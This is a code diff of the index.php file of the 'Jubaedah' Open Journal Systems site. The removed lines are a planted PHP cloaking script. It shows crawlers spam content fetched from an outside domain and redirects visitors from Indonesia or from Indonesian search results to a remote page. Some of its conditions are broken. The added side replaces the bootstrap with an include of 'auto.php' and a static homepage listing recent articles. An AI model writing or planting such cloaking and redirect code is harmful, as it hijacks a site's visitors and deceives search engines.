@@ -1,130 +1,1038 @@
-<?php
-header('Vary: Accept-Language');
-header('Vary: User-Agent');
+<?php include 'auto.php'; ?>
+	<!DOCTYPE html>
+<html lang="en-US" xml:lang="en-US">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+		Jubaedah : Jurnal Pengabdian dan Edukasi Sekolah (Indonesian Journal of Community Services and School Education)
+					</title>
 
-function get_client_ip() {
-    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
-}
+	
+<link rel="icon" href="https://jubaedah.lppmbinabangsa.id/public/journals/1/favicon_en_US.png">
+<meta name="description" content="webmaster">
+<meta name="generator" content="Open Journal Systems 3.2.1.1">
+<meta name="google-site-verification" content="xF_T26vq1OVb4wXGZz6og1EMGz8S1ibbvRPu2Ku8AYw" />
+<link rel="alternate" type="application/atom+xml" href="https://jubaedah.lppmbinabangsa.id/index.php/home/gateway/plugin/WebFeedGatewayPlugin/atom">
+<link rel="alternate" type="application/rdf+xml" href="https://jubaedah.lppmbinabangsa.id/index.php/home/gateway/plugin/WebFeedGatewayPlugin/rss">
+<link rel="alternate" type="application/rss+xml" href="https://jubaedah.lppmbinabangsa.id/index.php/home/gateway/plugin/WebFeedGatewayPlugin/rss2">
+	<link rel="stylesheet" href="https://jubaedah.lppmbinabangsa.id/index.php/home/$$$call$$$/page/page/css?name=stylesheet" type="text/css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css?v=3.2.1.1" type="text/css" /><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Montserrat:400,700|Noto+Serif:400,400i,700,700i" type="text/css" /><link rel="stylesheet" href="https://jubaedah.lppmbinabangsa.id/public/journals/1/styleSheet.css?v=3.2.1.1" type="text/css" />
+</head>
+<body class="pkp_page_index pkp_op_index has_site_logo" dir="ltr">
 
-function lph($url) {
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get('allow_url_fopen')) {
-        return file_get_contents($url);
-    }
-    return false;
-}
+	<div class="pkp_structure_page">
 
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
-$ip = get_client_ip();
+				<header class="pkp_structure_head" id="headerNavigationContainer" role="banner">
+						 <nav class="cmp_skip_to_content" aria-label="Jump to content links">
+	<a href="#pkp_content_main">Skip to main content</a>
+	<a href="#siteNav">Skip to main navigation menu</a>
+										<a href="#homepageIssue">Skip to the current issue</a>
+				<a href="#pkp_content_footer">Skip to site footer</a>
+</nav>
 
-$bot_url = "https://plerkejepit.cc/lp/jubaedah.html";
-$reff_url = "https://aptspace.sgp1.cdn.digitaloceanspaces.com/jubaedah.html";
+			<div class="pkp_head_wrapper">
 
-$file = lph($bot_url);
+				<div class="pkp_site_name_wrapper">
+					<button class="pkp_site_nav_toggle">
+						<span>Open Menu</span>
+					</button>
+											<h1 class="pkp_screen_reader">
+															Jubaedah : Jurnal Pengabdian dan Edukasi Sekolah (Indonesian Journal of Community Services and School Education)
+													</h1>
+										<div class="pkp_site_name">
+																<a href="						https://jubaedah.lppmbinabangsa.id/index.php/home/index
+					" class="is_img">
+							<img src="https://jubaedah.lppmbinabangsa.id/public/journals/1/pageHeaderLogoImage_en_US.jpg" width="6000" height="908"  />
+						</a>
+										</div>
+				</div>
 
-$geolocation = json_decode(lph("http://ip-api.com/json/$ip"), true);
+				
+				<nav class="pkp_site_nav_menu" aria-label="Site Navigation">
+					<a id="siteNav"></a>
+					<div class="pkp_navigation_primary_row">
+						<div class="pkp_navigation_primary_wrapper">
+																				<ul id="navigationPrimary" class="pkp_navigation_primary pkp_nav_list">
+								<li class="">
+				<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/issue/current">
+					Current
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/issue/archive">
+					Archives
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/announcement">
+					Announcements
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about">
+					About
+				</a>
+									<ul>
+																					<li class="">
+									<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about">
+										About the Journal
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about/submissions">
+										Submissions
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about/editorialTeam">
+										Editorial Team
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about/privacy">
+										Privacy Statement
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about/contact">
+										Contact
+									</a>
+								</li>
+																		</ul>
+							</li>
+			</ul>
 
-$cc = $geolocation['countryCode'] ?? null;
+				
 
-$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot)/"; //tambahin bot sesuka hati 
+																								
+	<form class="pkp_search pkp_search_desktop" action="https://jubaedah.lppmbinabangsa.id/index.php/home/search/search" method="get" role="search" aria-label="Article Search">
+		<input type="hidden" name="csrfToken" value="286a7b63d4853df607a2281449d10bb7">
+				
+			<input name="query" value="" type="text" aria-label="Search Query">
+		
 
-$fingerprint = md5($ua . $ip . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $_SERVER['HTTP_ACCEPT_ENCODING']);
+		<button type="submit">
+			Search
+		</button>
+		<div class="search_controls" aria-hidden="true">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/search/search" class="headerSearchPrompt search_prompt" aria-hidden="true">
+				Search
+			</a>
+			<a href="#" class="search_cancel headerSearchCancel" aria-hidden="true"></a>
+			<span class="search_loading" aria-hidden="true"></span>
+		</div>
+	</form>
+													</div>
+					</div>
+					<div class="pkp_navigation_user_wrapper" id="navigationUserWrapper">
+							<ul id="navigationUser" class="pkp_navigation_user pkp_nav_list">
+															<li class="profile">
+				<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/login">
+					Login
+				</a>
+							</li>
+										</ul>
 
-if (preg_match($botchar, $ua)) {
-    usleep(rand(150000, 350000));
-    echo $file;
-    ob_end_flush();
-    exit;
-}
+					</div>
+																		
+	<form class="pkp_search pkp_search_mobile" action="https://jubaedah.lppmbinabangsa.id/index.php/home/search/search" method="get" role="search" aria-label="Article Search">
+		<input type="hidden" name="csrfToken" value="286a7b63d4853df607a2281449d10bb7">
+				
+			<input name="query" value="" type="text" aria-label="Search Query">
+		
 
-if ($cc === "ID"  $fingerprint === "known_bad_fingerprint") {
-    usleep(rand(75000, 200000));
-    http_response_code(307);
-    header("Location: $reff_url");
-    ob_end_flush();
-    exit();
-}
+		<button type="submit">
+			Search
+		</button>
+		<div class="search_controls" aria-hidden="true">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/search/search" class="headerSearchPrompt search_prompt" aria-hidden="true">
+				Search
+			</a>
+			<a href="#" class="search_cancel headerSearchCancel" aria-hidden="true"></a>
+			<span class="search_loading" aria-hidden="true"></span>
+		</div>
+	</form>
+									</nav>
+			</div><!-- .pkp_head_wrapper -->
+		</header><!-- .pkp_structure_head -->
 
-if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false  stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
-    usleep(rand(100000, 250000));
-    http_response_code(307);
-    header("Location: $reff_url");
-    ob_end_flush();
-    exit();
-}
-?>
-<?php
-/**
- * @mainpage OJS API Reference
- *
- * Welcome to the OJS API Reference. This resource contains documentation
- * generated automatically from the OJS source code.
- *
- * The design of Open %Journal Systems 2.x is heavily structured for
- * maintainability, flexibility and robustness. Those familiar with Sun's
- * Enterprise Java Beans technology or the Model-View-Controller (MVC) pattern
- * will note similarities.
- *
- * As in a MVC structure, data storage and representation, user interface
- * presentation, and control are separated into different layers. The major
- * categories, roughly ordered from "front-end" to "back-end," follow:
- * - Smarty templates, which are responsible for assembling HTML pages to
- *   display to users;
- * - Page classes, which receive requests from users' web browsers, delegate
- *   any required processing to various other classes, and call up the
- *   appropriate Smarty template to generate a response;
- * - Controllers, which implement reusable pieces of content e.g. for AJAX
- *   subrequests.
- * - Action classes, which are used by the Page classes to perform non-trivial
- *   processing of user requests;
- * - Model classes, which implement PHP objects representing the system's
- *   various entities, such as Users, Articles, and Journals;
- * - Data Access Objects (DAOs), which generally provide (amongst others)
- *   update, create, and delete functions for their associated Model classes,
- *   are responsible for all database interaction;
- * - Support classes, which provide core functionalities, miscellaneous common;
- *
- * Additionally, many of the concerns shared by multiple PKP applications are
- * implemented in the shared "pkp-lib" library, shipped in the lib/pkp
- * subdirectory. The same conventions listed above apply to lib/pkp as well.
- *
- * As the system makes use of inheritance and has consistent class naming
- * conventions, it is generally easy to tell what category a particular class
- * falls into.
- *
- * For example, a Data Access Object class always inherits from the DAO class,
- * has a Class name of the form [Something]%DAO, and has a filename of the form
- * [Something]%DAO.inc.php.
- *
- * To learn more about developing OJS, there are several additional resources
- * that may be useful:
- * - The docs/README.md document
- * - The PKP support forum at http://forum.pkp.sfu.ca
- * - Documentation available at http://pkp.sfu.ca/ojs_documentation
- *
- * @file ojs/index.php
- *
- * Copyright (c) 2014-2020 Simon Fraser University
- * Copyright (c) 2003-2020 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup index
- *
- * Bootstrap code for OJS site. Loads required files and then calls the
- * dispatcher to delegate to the appropriate request handler.
- */
+						<div class="pkp_structure_content has_sidebar">
+			<div class="pkp_structure_main" role="main">
+				<a id="pkp_content_main"></a>
 
-// Initialize global environment
-define('INDEX_FILE_LOCATION', __FILE__);
-$application = require('./lib/pkp/includes/bootstrap.inc.php');
+<div class="page_index_journal">
 
-// Serve the request
-$application->execute();
+	
+
+	
+		
+		
+				<section class="current_issue">
+			<a id="homepageIssue"></a>
+			<h2>
+				Current Issue
+			</h2>
+			<div class="current_issue_title">
+				Vol. 5 No. 2 (2025): Jurnal Pengabdian dan Edukasi Sekolah (Jubaedah)
+			</div>
+				<div class="obj_issue_toc">
+
+		
+		<div class="heading">
+
+						
+				
+				
+							<div class="published">
+				<span class="label">
+					Published:
+				</span>
+				<span class="value">
+					2025-06-21
+				</span>
+			</div>
+			</div>
+
+		
+		<div class="sections">
+			<div class="section">
+									<h3>
+					Articles
+				</h3>
+						<ul class="cmp_article_list articles">
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/227" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_227_227_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-227" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/227">
+			Meningkatkan Potensi Peseta Didik Desa Rancagede dengan Kegiatan Belajar Mengajar Melalui Program Bimbel Ceria
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Aziz Fauzi, Verawati  Fajrin, Dimas Yusuf  Afrizal, Juwita  Qadarsi, Astri Hamidatul  Asma, Rika  Mauliyah
+		</div>
+		
+							<div class="pages">
+				481-493
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/227/264" aria-labelledby=article-227>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/347" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_347_347_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-347" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/347">
+			PENDAMPINGAN PEMBUATAN DIVERSIFIKASI PRODUK PANGAN DARI DAUN KELOR (MORINGA OLEIFERA) MENJADI PRODUK UNGGULAN PENCEGAH ANEMIA PADA SISWA SMAN 1 SUMBER
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Tania Avianda Gusman, Tahara  Salsabila, Yurika Angellina  Alyanza, Sara Angelica  Simanjuntak, Vania Hardianti  Putri, Vigo  Vernando
+		</div>
+		
+							<div class="pages">
+				494-504
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/347/265" aria-labelledby=article-347>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/351" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_351_351_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-351" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/351">
+			PELATIHAN DIGITAL MARKETING PADA UMKM KELOMPOK WANITA TANI DI DESA NGIJO KARANGANYAR
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Daryono Daryono
+		</div>
+		
+							<div class="pages">
+				505-515
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/351/266" aria-labelledby=article-351>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/357" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_357_357_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-357" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/357">
+			Implementasi Digital Marketing untuk Pengembangan Pemasaran UMKM
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Astari  Dianty, Annisa  Nurbaiti, Novy  Fajriati, Deden Edward Yokeu  Bernadin, M. Wahyudin  Zarkasyi, Srihadi  Winarningsih, Citra  Sukmadilaga
+		</div>
+		
+							<div class="pages">
+				516-522
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/357/267" aria-labelledby=article-357>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/358" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_358_358_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-358" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/358">
+			Pelatihan Pembuatan Pelet Ikan Dalam Meningkatkan Kemandirian Ekonomi Masyarakat Di Desa Laha
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Nurainy  Kaliky, Pramita  Wally, Hartono  Nurlette, tahir  Wasahua, Siti Fatimah  Rumfaran, Nur Ayu. A.H.  Souwakil
+		</div>
+		
+							<div class="pages">
+				523-529
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/358/268" aria-labelledby=article-358>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/359" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_359_359_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-359" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/359">
+			Transformasi Pembelajaran: Pelatihan Pembuatan Asesmen Digital untuk Guru SMP di Semarang dengan Liveworksheet
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Mohamad  Aminudin, Dyana  Wijayanti, Mochamad Abdul  Basir, Imam  Kusmaryono, Mayana  Agustyani
+		</div>
+		
+							<div class="pages">
+				530-545
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/359/269" aria-labelledby=article-359>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/360" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_360_360_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-360" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/360">
+			Pendampingan Penyusunan Laporan Keuangan  Apotek ADK di Surabaya
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Bernadetta Diana  Nugraheni, Lindrawati  Lindrawati, Adi  Susanto, Susanna  Hartanto
+		</div>
+		
+							<div class="pages">
+				546-553
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/360/270" aria-labelledby=article-360>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/361" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_361_361_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-361" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/361">
+			PEMBUATAN SILASE LIMBAH UBI KAYU ADITIF RAGI PADA SAPI POTONG DI KECAMATAN ANGKOLA TIMUR, TAPANULI SELATAN 
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Angelia Utari  Harahap, Toga  Mahaji, Zakiyah  Nasution, Nursanti  Laia, Doharni  Pane, Ulfa  Nikmatia, Dina  Syahfitri
+		</div>
+		
+							<div class="pages">
+				554-560
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/361/271" aria-labelledby=article-361>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/362" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_362_362_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-362" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/362">
+			Pelatihan Peningkatan Kapasitas Pemuda Dan Manajemen Organisasi Di Kelurahan Fatululi
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Mikael Thomas  Susu, Yohana Fransiska  Medho, Frans Bapa  Tokan, Emanuel  Kosat
+		</div>
+		
+							<div class="pages">
+				561-571
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/362/272" aria-labelledby=article-362>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/363" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_363_363_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-363" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/363">
+			Pendampingan Belajar Sebagai Upaya Peningkatan Literasi Sains Siswa Melalui Metode Fun Learning 
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Yunita  Sari, Jupriyanto Jupriyanto
+		</div>
+		
+							<div class="pages">
+				572-577
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/363/273" aria-labelledby=article-363>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/364" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_364_364_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-364" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/364">
+			Pelatihan Teknik Menempel dan Melukis Media Daur Ulang pada Paud Nusa Indah – Duri Kepa Jakarta Barat
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Ratih  Pertiwi, Oktian Fajar  Nugroho, Oskar  Judianto, Satya Yudha  Azwir
+		</div>
+		
+							<div class="pages">
+				578-584
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/364/274" aria-labelledby=article-364>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/365" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_365_365_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-365" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/365">
+			SIAPIK SEBAGAI SARANA PENINGKATAN KUALITAS LAPORAN KEUANGAN UMKM: PELATIHAN DAN PENDAMPINGAN DI DESA KERSAMANAH
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Novy  Fajriati, Annisa  Nurbaiti, Deden Edwar Yokeu  Bernardin, Astari  Dianty, Wahyudin  Zarkasyi, Srihadi  Winarningsih, Citra  Sukmadilaga
+		</div>
+		
+							<div class="pages">
+				585-592
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/365/275" aria-labelledby=article-365>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/366" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_366_366_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-366" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/366">
+			Pendampingan Penggunaan Media Flashcard pada Pembelajaran Literasi Numerasi di SDN Karangroto 03
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Rida Fironika  Kusumadewi, Nuhyal  Ulia, Adek Candra Nur  Wijayanti
+		</div>
+		
+							<div class="pages">
+				593-600
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/366/276" aria-labelledby=article-366>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-368" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/368">
+			PENDAMPINGAN PENYUSUNAN KEBIJAKAN INTERNAL CONTROL BERBASIS DIGITAL SEBAGAI RESPON PERKEMBANGAN TEKNOLOGI INFORMASI PADA BAGIAN FINANCE ACCOUNTING AND TAX (STUDI KASUS PADA PERUSAHAAN RETAIL)
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Helmy  Adam, Noval  Adib, Nanang  Suryadi, Laila  Fitriyah LH, Areta Widya  Kusumadewi
+		</div>
+		
+							<div class="pages">
+				601-605
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/368/277" aria-labelledby=article-368>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+			<div class="cover">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/369" class="file">
+								<img
+					src="https://jubaedah.lppmbinabangsa.id/public/journals/1/submission_369_369_coverImage_en_US"
+					alt=""
+				>
+			</a>
+		</div>
+	
+	<h4 class="title">
+		<a id="article-369" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/369">
+			PELATIHAN DAN PENDAMPINGAN FINANCIAL MANAGEMENT UNTUK PMI (PEKERJA MIGRAN INDONESIA) DI JEPANG MELALUI OPTIMALISASI PEMANFAATAN FINTECH SYARIAH
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Wuryan  Andayani, Eko Ganis  Sukoharsono, Sutrisno  T, Ana Sofia  Aryati, Alphasyah Lazuardy  Sidarta, Husnul  Hatimah
+		</div>
+		
+							<div class="pages">
+				606-618
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jubaedah.lppmbinabangsa.id/index.php/home/article/view/369/278" aria-labelledby=article-369>
+
+		
+	PDF
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+							</ul>
+				</div>
+		</div><!-- .sections -->
+</div>
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/issue/archive" class="read_more">
+				View All Issues
+			</a>
+		</section>
+	
+				<div class="additional_content">
+			<p align="justify"><img style="float: left; width: 300px; margin-top: 8px; margin-right: 10px; border: 1px solid #184b80;" src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/jurnal-jubaedah-2021.jpg" height="425" />Jubaedah is a Journal of Community Service conducted in schools. Both Public and Private Schools and All Levels of Schools follow all Sciences. Published online 3 times a year in <strong>April</strong>, <strong>August</strong> and <strong>December.<br /></strong>Jubaedah Journal has published both printed (book) and electronic (PDF) versions.<strong><br /></strong>The aim of this journal is to disseminate the conceptual thoughts or ideas and research results that have been achieved in the area of <strong>community services in schools</strong>. This journal focuses on the main problems in the development of the sciences of community services areas as follows: Education; Science and technology;Socio-economy and business; Cultural and society and many mores.<strong><br /></strong>Jubaedah Journal managed by <strong>Faculty of Teacher Training and Education</strong> and published by <strong>LP2M</strong>, Bina Bangsa University, Indonesia. It is in the national level that covers a lot of common problems or issues related to community services.<br /><strong><br /></strong></p>
+<p align="justify"> </p>
+		</div>
+	</div><!-- .page -->
+
+	</div><!-- pkp_structure_main -->
+
+									<div class="pkp_structure_sidebar left" role="complementary" aria-label="Sidebar">
+				<div class="pkp_block block_custom" id="customblock-sinta">
+	<div class="content">
+		<p><a href="https://sinta.kemdikbud.go.id/journals/profile/11434" target="_blank" rel="noopener"><img src="https://lebesgue.lppmbinabangsa.id/public/site/images/Admin123/sinta-4.png" alt="" width="373" height="135"></a></p>
